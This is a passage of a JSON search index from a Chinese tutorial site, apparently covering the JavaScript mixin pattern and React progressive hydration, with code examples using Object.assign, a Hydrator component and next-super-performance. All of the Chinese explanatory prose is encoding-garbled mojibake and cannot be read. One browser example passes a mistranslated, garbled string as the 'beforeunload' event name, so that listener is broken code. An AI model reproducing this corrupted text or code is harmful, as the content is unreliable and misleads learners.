çš„åŸå‹ä¸­ï¼\nclass Dog {\rconstructor(name) {\rthis.name = name;\r}\r}\rconst dogFunctionality = {\rbark: () =\u0026gt; console.log(\u0026#34;Woof!\u0026#34;),\rwagTail: () =\u0026gt; console.log(\u0026#34;Wagging my tail!\u0026#34;),\rplay: () =\u0026gt; console.log(\u0026#34;Playing!\u0026#34;)\r};\rObject.assign(Dog.prototype, dogFunctionality); åˆ›å»ºç¬¬ä¸€ä¸ªå® ç‰© pet1ï¼Œç§°ä¸º Daisyã€‚\nç”±äºåˆšåˆšåœ¨ Dog çš„åŸå‹ä¸­æ·»åŠ äº† dogFunctionality mixinï¼ŒDaisy åº”è¯¥èƒ½å¤Ÿèµ°è·¯ã€ç¡è§‰å’Œç©è€ï¼\n1 2 3 4 5 6  const pet1 = new Dog(\u0026#34;Daisy\u0026#34;); pet1.name; // Daisy pet1.bark(); // Woof! pet1.play(); // Playing!   Perfect! Mixins ä½¿æˆ‘ä»¬å¯ä»¥è½»æ¾åœ°å‘ç±»æˆ–å¯¹è±¡æ·»åŠ è‡ªå®šä¹‰åŠŸèƒ½ï¼Œè€Œæ— éœ€ä½¿ç”¨ç»§æ‰¿ã€‚\n\rä» mixin ç»§æ‰¿ è™½ç„¶å¯ä»¥åœ¨æ²¡æœ‰ç»§æ‰¿çš„æƒ…å†µä¸‹ä½¿ç”¨ mixin æ·»åŠ åŠŸèƒ½ï¼Œä½† mixin æœ¬èº«å¯ä»¥ä½¿ç”¨ç»§æ‰¿ï¼\nå¤§å¤šæ•°å“ºä¹³åŠ¨ç‰©ï¼ˆé™¤äº†æµ·è±š\u0026hellip;\u0026hellip;ä¹Ÿè®¸è¿˜æœ‰æ›´å¤šï¼‰ä¹Ÿå¯ä»¥èµ°è·¯å’Œç¡è§‰ã€‚ ç‹—æ˜¯å“ºä¹³åŠ¨ç‰©ï¼Œåº”è¯¥ä¼šèµ°è·¯å’Œç¡è§‰ï¼\nè®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ·»åŠ æ­¥è¡Œå’Œç¡çœ å±æ€§çš„ animalFunctionality mixinã€‚\nå¯ä»¥ä½¿ç”¨ Object.assign å°†è¿™äº›å±æ€§æ·»åŠ åˆ° dogFunctionality åŸå‹ä¸­ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç›®æ ‡å¯¹è±¡æ˜¯ dogFunctionalityã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  const animalFunctionality = { walk: () =\u0026gt; console.log(\u0026#34;Walking!\u0026#34;), sleep: () =\u0026gt; console.log(\u0026#34;Sleeping!\u0026#34;) }; const dogFunctionality = { bark: () =\u0026gt; console.log(\u0026#34;Woof!\u0026#34;), wagTail: () =\u0026gt; console.log(\u0026#34;Wagging my tail!\u0026#34;), play: () =\u0026gt; console.log(\u0026#34;Playing!\u0026#34;), walk() { super.walk(); }, sleep() { super.sleep(); } }; Object.assign(dogFunctionality, animalFunctionality); //æˆ–è€… \u0026lt;!-- const dogFunctionality = { __proto__: animalFunctionality, bark: () =\u0026gt; console.log(\u0026#34;Woof!\u0026#34;), wagTail: () =\u0026gt; console.log(\u0026#34;Wagging my tail!\u0026#34;), play: () =\u0026gt; console.log(\u0026#34;Playing!\u0026#34;), walk() { super.walk(); }, sleep() { super.sleep(); } }; --\u0026gt; Object.assign(Dog.prototype, dogFunctionality);   1 2 3 4 5 6 7 8  const pet1 = new Dog(\u0026#34;Daisy\u0026#34;); console.log(pet1.name); //Daisy pet1.bark(); //Woof! pet1.play(); //Playing! pet1.walk(); //Walking! pet1.sleep(); //Sleeping!   Perfect! Dog çš„ä»»ä½•æ–°å®ä¾‹ç°åœ¨ä¹Ÿå¯ä»¥è®¿é—® walk å’Œ sleep æ–¹æ³•ã€‚\n\ræµè§ˆå™¨ä¸­çš„ mixin ç°å®ä¸–ç•Œä¸­çš„ mixin ç¤ºä¾‹åœ¨æµè§ˆå™¨ç¯å¢ƒä¸­çš„ Window ç•Œé¢ä¸Šå¯è§ã€‚\nWindow å¯¹è±¡ä» WindowOrWorkerGlobalScope å’Œ WindowEventHandlers æ··åˆä¸­å®ç°äº†å®ƒçš„è®¸å¤šå±æ€§ï¼Œ\nè¿™å…è®¸æˆ‘ä»¬è®¿é—®è¯¸å¦‚ setTimeout å’Œ setIntervalã€indexedDB å’Œ isSecureContext ç­‰å±æ€§ã€‚\nç”±äºå®ƒæ˜¯ä¸€ä¸ª mixinï¼Œå› æ­¤ä»…ç”¨äºå‘å¯¹è±¡æ·»åŠ åŠŸèƒ½ï¼Œæ— æ³•åˆ›å»º WindowOrWorkerGlobalScope ç±»å‹çš„å¯¹è±¡ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  window.indexedDB.open(\u0026#34;toDoList\u0026#34;); window.addEventListener(\u0026#34;å¸è½½å‰\u0026#34;, event =\u0026gt; { event.preventDefault(); event.returnValue = \u0026#34;\u0026#34;; }); window.onbeforeunload = function() { console.log(\u0026#34;å¸è½½!\u0026#34;); }; console.log( \u0026#34;æ¥è‡ª WindowEventHandlers mixinï¼šå¸è½½å‰\u0026#34;, window.onbeforeunload ); console.log( \u0026#34;æ¥è‡ª WindowEventHandlers mixinï¼šæ˜¯å®‰å…¨ä¸Šä¸‹æ–‡\u0026#34;, window.isSecureContext ); console.log( \u0026#34;WindowEventHandlers æœ¬èº«æœªå®šä¹‰\u0026#34;, window.WindowEventHandlers ); console.log( \u0026#34;WindowOrWorkerGlobalScope æœ¬èº«æœªå®šä¹‰\u0026#34;, window.WindowOrWorkerGlobalScope ); //æ¥è‡ª WindowEventHandlers mixinï¼šå¸è½½å‰ f(){} //æ¥è‡ª WindowEventHandlers mixinï¼šæ˜¯å®‰å…¨ä¸Šä¸‹æ–‡ true //WindowEventHandlers æœ¬èº«æœªå®šä¹‰ undefined //WindowOrWorkerGlobalScope æœ¬èº«æœªå®šä¹‰ undefined   \rReact (ES6ä¹‹å‰) åœ¨å¼•å…¥ ES6 ç±»ä¹‹å‰ï¼Œé€šå¸¸ä½¿ç”¨ Mixin å‘ React ç»„ä»¶æ·»åŠ åŠŸèƒ½ã€‚\nReact å›¢é˜Ÿä¸é¼“åŠ±ä½¿ç”¨ mixinï¼Œå› ä¸ºå®ƒå¾ˆå®¹æ˜“ç»™ç»„ä»¶å¢åŠ ä¸å¿…è¦çš„å¤æ‚æ€§ï¼Œä½¿å…¶éš¾ä»¥ç»´æŠ¤å’Œé‡ç”¨ã€‚\nReact å›¢é˜Ÿé¼“åŠ±ä½¿ç”¨é«˜é˜¶ç»„ä»¶ï¼Œç°åœ¨é€šå¸¸å¯ä»¥ç”¨ Hooks ä»£æ›¿ã€‚\n\rç¼ºç‚¹ Mixins å…è®¸æˆ‘ä»¬é€šè¿‡å°†åŠŸèƒ½æ³¨å…¥å¯¹è±¡çš„åŸå‹ï¼Œè½»æ¾åœ°å‘å¯¹è±¡æ·»åŠ åŠŸèƒ½è€Œæ— éœ€ç»§æ‰¿ã€‚\nä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„åŸå‹è¢«è§†ä¸ºä¸å¥½çš„åšæ³•ï¼Œå› ä¸ºå®ƒä¼šå¯¼è‡´åŸå‹æ±¡æŸ“å’Œå‡½æ•°æ¥æºçš„ä¸€å®šç¨‹åº¦çš„ä¸ç¡®å®šæ€§ã€‚\n\rçŸ¥è¯†ç‚¹  Object.assign ç”¨äºå°†æ‰€æœ‰å¯æšä¸¾å±æ€§çš„å€¼ä»ä¸€ä¸ªæˆ–å¤šä¸ªæºå¯¹è±¡åˆ†é…åˆ°ç›®æ ‡å¯¹è±¡ã€‚å®ƒå°†è¿”å›ç›®æ ‡å¯¹è±¡ã€‚  ","description":"å‘å¯¹è±¡æˆ–ç±»æ·»åŠ åŠŸèƒ½è€Œæ— éœ€ç»§æ‰¿","id":112,"section":"react-patterns","tags":null,"title":"æ··åˆæ¨¡å¼ï¼ˆXï¼‰","uri":"https://codthing.github.io/react-patterns/design-patterns/mixin-pattern/"},{"content":"ç®€ä»‹ æœåŠ¡å™¨å‘ˆç°çš„åº”ç”¨ç¨‹åºä½¿ç”¨æœåŠ¡å™¨ä¸ºå½“å‰å¯¼èˆªç”Ÿæˆ HTMLã€‚\nä¸€æ—¦æœåŠ¡å™¨å®Œæˆç”Ÿæˆ HTML å†…å®¹ï¼ˆå…¶ä¸­è¿˜åŒ…å«æ­£ç¡®æ˜¾ç¤ºé™æ€ UI æ‰€éœ€çš„ CSS å’Œ JSON æ•°æ®ï¼‰ï¼Œå®ƒå°±ä¼šå°†æ•°æ®å‘é€ç»™å®¢æˆ·ç«¯ã€‚\nç”±äºæœåŠ¡å™¨ä¸ºæˆ‘ä»¬ç”Ÿæˆäº†æ ‡è®°ï¼Œå®¢æˆ·ç«¯å¯ä»¥å¿«é€Ÿè§£æå®ƒå¹¶å°†å…¶æ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼Œä»è€Œäº§ç”Ÿå¿«é€Ÿçš„ First Contentful Paintï¼\nå°½ç®¡æœåŠ¡å™¨æ¸²æŸ“æä¾›äº†æ›´å¿«çš„é¦–æ¬¡å†…å®¹ç»˜åˆ¶ï¼Œä½†å®ƒå¹¶ä¸æ€»æ˜¯æä¾›æ›´å¿«çš„äº¤äº’æ—¶é—´ã€‚\nä¸æˆ‘ä»¬çš„ç½‘ç«™è¿›è¡Œäº¤äº’æ‰€éœ€çš„ JavaScript å°šæœªåŠ è½½ã€‚æŒ‰é’®å¯èƒ½çœ‹èµ·æ¥æ˜¯äº¤äº’å¼çš„ï¼Œä½†å®ƒä»¬è¿˜ä¸æ˜¯äº¤äº’å¼çš„ï¼ˆç›®å‰ï¼‰ã€‚\nåªæœ‰åœ¨ JavaScript åŒ…è¢«åŠ è½½å’Œå¤„ç†åï¼Œå¤„ç†ç¨‹åºæ‰ä¼šè¢«é™„åŠ ã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸º hydrationï¼šReact æ£€æŸ¥å½“å‰çš„ DOM èŠ‚ç‚¹ï¼Œå¹¶ä½¿ç”¨ç›¸åº”çš„ JavaScript æ¥å¯¹èŠ‚ç‚¹è¿›è¡Œ hydrationã€‚\nç”¨æˆ·åœ¨å±å¹•ä¸Šçœ‹åˆ°éäº¤äº’å¼ UI çš„æ—¶é—´ä¹Ÿè¢«ç§°ä¸ºææ€–è°·ï¼šè™½ç„¶ç”¨æˆ·å¯èƒ½è®¤ä¸ºä»–ä»¬å¯ä»¥ä¸ç½‘ç«™è¿›è¡Œäº¤äº’ï¼Œä½†è¿˜æ²¡æœ‰é™„åŠ åˆ°ç»„ä»¶çš„å¤„ç†ç¨‹åºã€‚\nè¿™å¯¹ç”¨æˆ·æ¥è¯´å¯èƒ½æ˜¯ä¸€ç§ä»¤äººæ²®ä¸§çš„ä½“éªŒï¼Œå› ä¸º UI å¯èƒ½ä¼šåƒè¢«å†»ç»“ä¸€æ ·ï¼\nä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„ DOM ç»„ä»¶å¯èƒ½éœ€è¦ä¸€æ®µæ—¶é—´æ‰èƒ½å®Œå…¨æ°´åˆã€‚\nåœ¨ç»„ä»¶å¯ä»¥è¢«æ°´åŒ–ä¹‹å‰ï¼Œéœ€è¦åŠ è½½ã€å¤„ç†å’Œæ‰§è¡Œ JavaScript æ–‡ä»¶ã€‚ä¸åƒæˆ‘ä»¬ä¹‹å‰é‚£æ ·ä¸€æ¬¡æ€§å¯¹æ•´ä¸ªåº”ç”¨ç¨‹åºåŠ æ°´ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€æ­¥å¯¹ DOM èŠ‚ç‚¹åŠ æ°´ã€‚\næ¸è¿›å¼æ°´åˆä½¿å¾—éšç€æ—¶é—´çš„æ¨ç§»å•ç‹¬æ°´åˆèŠ‚ç‚¹æˆä¸ºå¯èƒ½ï¼Œè¿™ä½¿å¾—ä»…è¯·æ±‚æœ€å°‘å¿…è¦çš„ JavaScript æˆä¸ºå¯èƒ½ã€‚\n\ré€šè¿‡é€æ­¥è¡¥æ°´åº”ç”¨ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥å»¶è¿Ÿé¡µé¢ä¸å¤ªé‡è¦çš„éƒ¨åˆ†çš„è¡¥æ°´ã€‚\nè¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥å‡å°‘ä¸ºäº†ä½¿é¡µé¢å…·æœ‰äº¤äº’æ€§è€Œå¿…é¡»è¯·æ±‚çš„ JavaScript é‡ï¼Œå¹¶ä¸”ä»…åœ¨ç”¨æˆ·éœ€è¦æ—¶æ‰å¯¹èŠ‚ç‚¹è¿›è¡Œæ°´åˆã€‚\næ¸è¿›å¼è¡¥æ°´è¿˜æœ‰åŠ©äºé¿å…æœ€å¸¸è§çš„ SSR è¡¥æ°´é™·é˜±ï¼Œå³æœåŠ¡å™¨æ¸²æŸ“çš„ DOM æ ‘è¢«ç ´åç„¶åç«‹å³é‡å»ºã€‚\n\ræ¸è¿›å¼æ°´åŒ–å…è®¸æˆ‘ä»¬ä»…æ ¹æ®ç‰¹å®šæ¡ä»¶å¯¹ç»„ä»¶è¿›è¡Œæ°´åŒ–ï¼Œä¾‹å¦‚å½“ç»„ä»¶åœ¨è§†å£ä¸­å¯è§æ—¶ã€‚\nåœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªç”¨æˆ·åˆ—è¡¨ï¼Œä¸€æ—¦åˆ—è¡¨å‡ºç°åœ¨è§†å£ä¸­ï¼Œè¿™äº›ç”¨æˆ·åˆ—è¡¨å°±ä¼šé€æ¸å˜æ°´ã€‚\nå½“ç»„ä»¶å·²è¢«æ°´åˆæ—¶ï¼Œç´«è‰²é—ªçƒæ˜¾ç¤ºï¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  //App.js import React from \u0026#34;react\u0026#34;; import { Hydrator as ClientHydrator, ServerHydrator } from \u0026#34;./Hydrator\u0026#34;; let load = () =\u0026gt; import(\u0026#34;./Stream\u0026#34;); let Hydrator = ClientHydrator; if (typeof window === \u0026#34;undefined\u0026#34;) { Hydrator = ServerHydrator; load = () =\u0026gt; require(\u0026#34;./Stream\u0026#34;); } export default function App() { return ( \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;div className=\u0026#34;intro\u0026#34;\u0026gt; \u0026lt;p\u0026gt; This is an example of how server-side rendered React can enable{\u0026#34; \u0026#34;} \u0026lt;strong\u0026gt;progressively hydrated\u0026lt;/strong\u0026gt; experiences. \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; \u0026lt;strong\u0026gt;Scroll down.\u0026lt;/strong\u0026gt; The flash of color you see is an indicator of JavaScript being fetched without any direct change to the UI. \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;Hydrator load={load} /\u0026gt; \u0026lt;/div\u0026gt; ); } //client.js import React from \u0026#34;react\u0026#34;; import { hydrate } from \u0026#34;react-dom\u0026#34;; import App from \u0026#34;./components/App\u0026#34;; hydrate(\u0026lt;App /\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;)); //server.js import React from \u0026#34;react\u0026#34;; import { renderToNodeStream } from \u0026#34;react-dom/server\u0026#34;; import App from \u0026#34;./components/App\u0026#34;; export default async () =\u0026gt; renderToNodeStream(\u0026lt;App /\u0026gt;);   è™½ç„¶å®ƒå‘ç”Ÿå¾—å¾ˆå¿«ï¼Œä½†æ‚¨å¯ä»¥çœ‹åˆ°åˆå§‹ UI ä¸å¤„äºæ°´åˆçŠ¶æ€çš„ UI ç›¸åŒï¼\nç”±äºæœ€åˆçš„ HTML åŒ…å«ç›¸åŒçš„ä¿¡æ¯å’Œæ ·å¼ï¼Œæˆ‘ä»¬å¯ä»¥æ— ç¼åœ°ä½¿ç»„ä»¶å…·æœ‰äº¤äº’æ€§ï¼Œè€Œæ— éœ€ä»»ä½•åä¸½æˆ–è·³è·ƒçš„ UIã€‚\næ¸è¿›å¼æ°´åŒ–å¯ä»¥æœ‰æ¡ä»¶åœ°ä½¿æŸäº›ç»„ä»¶å…·æœ‰äº¤äº’æ€§ï¼Œè€Œæ‚¨çš„åº”ç”¨ç¨‹åºç”¨æˆ·å¯èƒ½å®Œå…¨ä¸ä¼šæ³¨æ„åˆ°è¿™ä¸€ç‚¹ã€‚\n\ræ¸è¿›å¼æ°´åŒ–å®æ–½ åœ¨ä½¿ç”¨ React å®ç° SSR çš„éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬è®¨è®ºäº†åœ¨æœåŠ¡å™¨ä¸Šå‘ˆç°çš„åº”ç”¨ç¨‹åºçš„å®¢æˆ·ç«¯æ°´åŒ–ã€‚\nHydration å…è®¸å®¢æˆ·ç«¯ React è¯†åˆ«åœ¨æœåŠ¡å™¨ä¸Šå‘ˆç°çš„ ReactDOM ç»„ä»¶å¹¶å°†äº‹ä»¶é™„åŠ åˆ°è¿™äº›ç»„ä»¶ã€‚\nå› æ­¤ï¼Œä¸€æ—¦ SSR åº”ç”¨ç¨‹åºåœ¨å®¢æˆ·ç«¯ä¸Šå¯ç”¨ï¼Œå®ƒå°±ä¼šä¸º SSR åº”ç”¨ç¨‹åºå¼•å…¥è¿ç»­æ€§å’Œæ— ç¼æ€§ï¼Œä½¿å…¶åƒ CSR åº”ç”¨ç¨‹åºä¸€æ ·è¿è¡Œã€‚\nä¸ºäº†è®©é¡µé¢ä¸Šçš„æ‰€æœ‰ç»„ä»¶é€šè¿‡æ°´åŒ–æˆä¸ºå¯äº¤äº’çš„ï¼Œè¿™äº›ç»„ä»¶çš„ React ä»£ç åº”è¯¥åŒ…å«åœ¨ä¸‹è½½åˆ°å®¢æˆ·ç«¯çš„åŒ…ä¸­ã€‚\nä¸»è¦ç”± JavaScript æ§åˆ¶çš„é«˜åº¦äº¤äº’çš„ SPA éœ€è¦ä¸€æ¬¡æ€§å®Œæˆæ•´ä¸ªåŒ…ã€‚\nä½†æ˜¯ï¼Œå¤§å¤šæ•°é™æ€ç½‘ç«™åœ¨å±å¹•ä¸Šå…·æœ‰ä¸€äº›äº¤äº’å¼å…ƒç´ ï¼Œå¯èƒ½ä¸éœ€è¦æ‰€æœ‰ç»„ä»¶ç«‹å³å¤„äºæ´»åŠ¨çŠ¶æ€ã€‚\nå¯¹äºè¿™æ ·çš„ç½‘ç«™ï¼Œä¸ºå±å¹•ä¸Šçš„æ¯ä¸ªç»„ä»¶å‘é€ä¸€ä¸ªå·¨å¤§çš„ React åŒ…æˆä¸ºä¸€ç§å¼€é”€ã€‚\nProgressive Hydration é€šè¿‡å…è®¸æˆ‘ä»¬åœ¨é¡µé¢åŠ è½½æ—¶ä»…å¯¹åº”ç”¨ç¨‹åºçš„æŸäº›éƒ¨åˆ†è¿›è¡Œæ°´åˆæ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚\nå…¶ä»–éƒ¨åˆ†æ ¹æ®éœ€è¦é€æ¸æ°´åˆã€‚\né€šè¿‡æ¸è¿›å¼æ°´åˆï¼Œâ€œæ‚¨å¯èƒ½è¿˜å–œæ¬¢â€å’Œâ€œå…¶ä»–å†…å®¹â€ç»„ä»¶å¯ä»¥ç¨åè¿›è¡Œæ°´åˆã€‚\næ°´åŒ–æ­¥éª¤ä¸æ˜¯ç«‹å³åˆå§‹åŒ–æ•´ä¸ªåº”ç”¨ç¨‹åºï¼Œè€Œæ˜¯ä» DOM æ ‘çš„æ ¹éƒ¨å¼€å§‹ï¼Œä½†æ˜¯æœåŠ¡å™¨æ¸²æŸ“çš„åº”ç”¨ç¨‹åºçš„å„ä¸ªéƒ¨åˆ†ä¼šåœ¨ä¸€æ®µæ—¶é—´å†…è¢«æ¿€æ´»ã€‚\næ°´åˆè¿‡ç¨‹å¯èƒ½ä¼šå› å„ç§åˆ†æ”¯è€Œåœæ­¢ï¼Œå¹¶åœ¨å®ƒä»¬è¿›å…¥è§†å£æ—¶æˆ–åŸºäºæŸäº›å…¶ä»–è§¦å‘å™¨åæ¢å¤ã€‚\nè¯·æ³¨æ„ï¼Œæ‰§è¡Œæ¯ä¸ª hydration æ‰€éœ€çš„èµ„æºåŠ è½½ä¹Ÿä½¿ç”¨ä»£ç æ‹†åˆ†æŠ€æœ¯å»¶è¿Ÿï¼Œä»è€Œå‡å°‘äº†ä½¿é¡µé¢å…·æœ‰äº¤äº’æ€§æ‰€éœ€çš„ JavaScript é‡ã€‚\næ¸è¿›å¼æ°´åŒ–èƒŒåçš„æƒ³æ³•æ˜¯é€šè¿‡åˆ†å—æ¿€æ´»æ‚¨çš„åº”ç”¨ç¨‹åºæ¥æä¾›å‡ºè‰²çš„æ€§èƒ½ã€‚\nä»»ä½•æ¸è¿›å¼è¡¥æ°´è§£å†³æ–¹æ¡ˆè¿˜åº”è€ƒè™‘å®ƒå°†å¦‚ä½•å½±å“æ•´ä½“ç”¨æˆ·ä½“éªŒã€‚\nä¸èƒ½è®©å±å¹•å—ä¸€ä¸ªæ¥ä¸€ä¸ªåœ°å¼¹å‡ºï¼Œä½†é˜»æ­¢å·²ç»åŠ è½½çš„å—ä¸Šçš„ä»»ä½•æ´»åŠ¨æˆ–ç”¨æˆ·è¾“å…¥ã€‚\nå› æ­¤ï¼Œæ•´ä½“æ¸è¿›å¼æ°´åŒ–å®æ–½çš„è¦æ±‚å¦‚ä¸‹ã€‚\n  å…è®¸å¯¹æ‰€æœ‰ç»„ä»¶ä½¿ç”¨ SSR\n  æ”¯æŒå°†ä»£ç æ‹†åˆ†ä¸ºå•ç‹¬çš„ç»„ä»¶æˆ–å—\n  æ”¯æŒåœ¨å¼€å‘äººå‘˜å®šä¹‰çš„åºåˆ—ä¸­å¯¹è¿™äº›å—è¿›è¡Œå®¢æˆ·ç«¯æ°´åˆ\n  ä¸ä¼šé˜»æ­¢ç”¨æˆ·å¯¹å·²ç»æ°´åˆçš„å—è¿›è¡Œè¾“å…¥\n  å…è®¸å¯¹å»¶è¿Ÿæ°´åŒ–çš„å—ä½¿ç”¨æŸç§åŠ è½½æŒ‡ç¤ºå™¨\n  ä¸€æ—¦æ‰€æœ‰äººéƒ½å¯ä»¥ä½¿ç”¨ React å¹¶å‘æ¨¡å¼ï¼Œå®ƒå°†æ»¡è¶³æ‰€æœ‰è¿™äº›è¦æ±‚ã€‚\nå®ƒå…è®¸ React åŒæ—¶å¤„ç†ä¸åŒçš„ä»»åŠ¡ï¼Œå¹¶æ ¹æ®ç»™å®šçš„ä¼˜å…ˆçº§åœ¨å®ƒä»¬ä¹‹é—´åˆ‡æ¢ã€‚\nåˆ‡æ¢æ—¶ï¼Œéƒ¨åˆ†æ¸²æŸ“çš„æ ‘ä¸éœ€è¦æäº¤ï¼Œè¿™æ ·ä¸€æ—¦ React åˆ‡æ¢å›ç›¸åŒçš„ä»»åŠ¡ï¼Œæ¸²æŸ“ä»»åŠ¡å°±å¯ä»¥ç»§ç»­ã€‚\nå¹¶å‘æ¨¡å¼å¯ç”¨äºå®ç°æ¸è¿›å¼æ°´åŒ–ã€‚\nåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé¡µé¢ä¸Šæ¯ä¸ªå—çš„ hydration æˆä¸º React å¹¶å‘æ¨¡å¼çš„ä»»åŠ¡ã€‚\nå¦‚æœéœ€è¦æ‰§è¡Œç”¨æˆ·è¾“å…¥ç­‰æ›´é«˜ä¼˜å…ˆçº§çš„ä»»åŠ¡ï¼ŒReact å°†æš‚åœæ°´åŒ–ä»»åŠ¡å¹¶åˆ‡æ¢åˆ°æ¥å—ç”¨æˆ·è¾“å…¥ã€‚\nè¯¸å¦‚lazy()ã€Suspense() ç­‰åŠŸèƒ½å…è®¸æ‚¨ä½¿ç”¨å£°æ˜å¼åŠ è½½çŠ¶æ€ã€‚è¿™äº›å¯ç”¨äºåœ¨å—è¢«å»¶è¿ŸåŠ è½½æ—¶æ˜¾ç¤ºåŠ è½½æŒ‡ç¤ºå™¨ã€‚ SuspenseList() å¯ç”¨äºå®šä¹‰å»¶è¿ŸåŠ è½½ç»„ä»¶çš„ä¼˜å…ˆçº§ã€‚\nè¿™ä¸ªæ¼”ç¤ºå±•ç¤ºäº†å¹¶å‘æ¨¡å¼çš„ä½œç”¨å¹¶å®ç°äº†æ¸è¿›å¼æ°´åŒ–ã€‚\nReact å¹¶å‘æ¨¡å¼ä¹Ÿå¯ä»¥ä¸å¦ä¸€ä¸ª React ç‰¹æ€§ç»“åˆä½¿ç”¨\n æœåŠ¡å™¨ç»„ä»¶ã€‚ è¿™å°†å…è®¸ä»æœåŠ¡å™¨é‡æ–°è·å–ç»„ä»¶å¹¶åœ¨å®ƒä»¬æµå…¥æ—¶åœ¨å®¢æˆ·ç«¯ä¸Šå‘ˆç°å®ƒä»¬ï¼Œè€Œä¸æ˜¯ç­‰å¾…æ•´ä¸ªè·å–å®Œæˆã€‚ å› æ­¤ï¼Œå³ä½¿åœ¨æˆ‘ä»¬ç­‰å¾…ç½‘ç»œè·å–å®Œæˆæ—¶ï¼Œå®¢æˆ·ç«¯çš„ CPU ä¹Ÿä¼šå¼€å§‹å·¥ä½œã€‚  è™½ç„¶åŸºäº React å¹¶å‘æ¨¡å¼çš„æ¸è¿›å¼æ°´åŒ–å®ç°ä»åœ¨å‡†å¤‡ä¸­ï¼Œä½†è¿˜æœ‰è®¸å¤šå…¶ä»–ç«äº‰è€…å¯ä»¥ä½¿ç”¨éƒ¨åˆ†æ°´åŒ–å®ç°ã€‚ åœ¨ Google I/O \u0026lsquo;19ä¸Šå±•ç¤ºäº†æ¸è¿›å¼è¡¥æ°´ã€‚ æ¸è¿›å¼æ°´åŒ–æ¼”ç¤ºå±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ Hydrator ç»„ä»¶å¯¹é¡µé¢çš„é€‰å®šéƒ¨åˆ†è¿›è¡Œæ°´åŒ–ã€‚ å¯¹äºä¸åŒçš„å®¢æˆ·ç«¯æ¡†æ¶ï¼Œç”±æ­¤äº§ç”Ÿäº†å¤šç§å®ç°ã€‚ å®ç°ä¹Ÿå¯ç”¨äº Vueã€Angular å’Œ Next.jsã€‚\nè®©æˆ‘ä»¬ä½¿ç”¨ Preact å’Œ Next.js å¿«é€Ÿæµè§ˆä¸€ä¸ªè¿™æ ·çš„æ–¹æ³•\nè¿™ æ˜¯ä¸€ä¸ªç”¨äºéƒ¨åˆ†æ°´åˆä½œç”¨çš„ POC\n  pool-attendant-preactï¼šä¸€ä¸ªä½¿ç”¨ preact x å®ç°éƒ¨åˆ†æ°´åŒ–çš„åº“ã€‚\n  next-super-performanceï¼šä¸€ä¸ª Next.js æ’ä»¶ï¼Œå®ƒä½¿ç”¨è¿™ä¸ªåº“æ¥æé«˜å®¢æˆ·ç«¯æ€§èƒ½ã€‚\n  pool-attendant-preact åº“åŒ…å«ä¸€ä¸ªåä¸º withHydration çš„ APIï¼Œå¯æ ‡è®°æ›´å…·äº¤äº’æ€§çš„ç»„ä»¶è¿›è¡Œæ°´åŒ–ã€‚\nè¿™äº›å°†é¦–å…ˆè¢«æ°´åŒ–ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥å®šä¹‰æ‚¨çš„é¡µé¢å†…å®¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚\nimport Teaser from \u0026#34;./teaser\u0026#34;;\rimport { withHydration } from \u0026#34;next-super-performance\u0026#34;;\rconst HydratedTeaser = withHydration(Teaser);\rexport default function Body() {\rreturn (\r\u0026lt;main\u0026gt;\r\u0026lt;Teaser column={1} /\u0026gt;\r\u0026lt;HydratedTeaser column={2} /\u0026gt;\r\u0026lt;HydratedTeaser column={3} /\u0026gt;\r\u0026lt;Teaser column={1} /\u0026gt;\r\u0026lt;Teaser column={2} /\u0026gt;\r\u0026lt;Teaser column={3} /\u0026gt;\r\u0026lt;Teaser column={1} /\u0026gt;\r\u0026lt;Teaser column={2} /\u0026gt;\r\u0026lt;Teaser column={3} /\u0026gt;\r\u0026lt;/main\u0026gt;\r);\r} ç¬¬ 2 åˆ—å’Œç¬¬ 3 åˆ—ä¸­çš„ç»„ä»¶ HydratedTeaser å°†é¦–å…ˆæ°´åˆã€‚\nç°åœ¨å¯ä»¥ä½¿ç”¨ hydrate() API å¯¹å®¢æˆ·ç«¯ä¸Šçš„å…¶ä½™ç»„ä»¶è¿›è¡Œæ°´åˆï¼Œè¯¥ API ä¹ŸåŒ…å«åœ¨åº“ä¸­ã€‚\nimport { hydrate } from \u0026#34;next-super-performance\u0026#34;;\rimport Teaser from \u0026#34;./components/teaser\u0026#34;;\rhydrate([Teaser]); ç»„ä»¶ HydrationData ç”¨äºå°†åºåˆ—åŒ–çš„ props å†™å…¥å®¢æˆ·ç«¯ã€‚\nå®ƒå°†ç¡®ä¿æ‰€éœ€çš„é“å…·å¯ç”¨äºè¢«æ°´åˆçš„ç»„ä»¶ã€‚\nimport Header from \u0026#34;../components/header\u0026#34;;\rimport Main from \u0026#34;../components/main\u0026#34;;\rimport { HydrationData } from \u0026#34;next-super-performance\u0026#34;;\rexport default function Home() {\rreturn (\r\u0026lt;section\u0026gt;\r\u0026lt;Header /\u0026gt;\r\u0026lt;Main /\u0026gt;\r\u0026lt;HydrationData /\u0026gt;\r\u0026lt;/section\u0026gt;\r);\r} \ræ¸è¿›æ°´åˆçš„ä¼˜ç¼ºç‚¹ 